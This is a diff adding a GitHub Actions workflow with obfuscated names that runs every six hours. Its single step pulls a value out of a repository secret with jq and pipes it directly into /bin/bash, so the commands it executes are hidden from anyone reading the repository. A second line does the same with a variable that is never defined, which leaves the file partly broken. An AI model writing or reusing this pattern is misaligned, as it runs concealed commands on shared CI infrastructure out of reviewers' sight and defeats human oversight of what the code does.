@@ -1,0 +1,19 @@
+name: guanchangzhishangs
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '35 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: guanchangzhishangs
+        env:
+          t13610: ${{ secrets.t13610 }}
+        run: |
+          echo $t13610 | jq -r .wres9 | /bin/bash
+          echo $ojzr2336 | jq -r .rdpo3036 | /bin/bash
+
